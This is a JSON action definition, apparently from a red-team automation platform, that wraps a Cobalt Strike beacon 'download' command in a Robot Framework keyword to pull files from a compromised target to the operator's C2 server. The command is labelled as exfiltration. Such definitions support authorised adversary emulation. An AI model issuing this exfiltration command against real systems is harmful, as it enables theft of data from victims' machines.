{
  "_key": "cs-download-file",
  "name": "Download File",
  "description": "Download a file from target to operator machine via Cobalt Strike beacon",
  "icon": "\u2b07\ufe0f",
  "tactic": "TA0009",
  "category": "Cobalt Strike",
  "subcategory": "Exfiltration",
  "riskLevel": "Medium",
  "estimatedDuration": 30,
  "executionType": "cobalt_strike",
  "robotKeyword": "Download File",
  "robotTemplate": "${output}=    cobaltstrike.Download File    ${session}    ${target_file}",
  "cobaltStrikeCommand": "download ${target_file}",
  "inputs": [
    {
      "id": "session",
      "label": "Beacon Session",
      "type": "Agent_Session",
      "required": true
    }
  ],
  "outputs": [
    {
      "id": "session",
      "label": "Session",
      "type": "Agent_Session"
    }
  ],
  "parameters": [
    {
      "id": "session",
      "label": "Session",
      "type": "string",
      "required": true,
      "placeholder": "${session}"
    },
    {
      "id": "target_file",
      "label": "Remote File Path",
      "type": "string",
      "required": true,
      "placeholder": "C:\\Windows\\Temp\\tmp.zip"
    }
  ],
  "requirements": {
    "c2Server": true
  },
  "robotFramework": {
    "libraries": [
      "cobaltstrikec2/cobaltstrike.py"
    ],
    "keyword": "Download File",
    "captureOutput": "DOWNLOAD_RESULT",
    "keywordArgs": [
      {
        "position": 1,
        "sessionVariable": "CURRENT_SESSION"
      },
      {
        "position": 2,
        "param": "target_file"
      }
    ],
    "variables": [],
    "preKeywordLog": "Downloading ${target_file}"
  }
}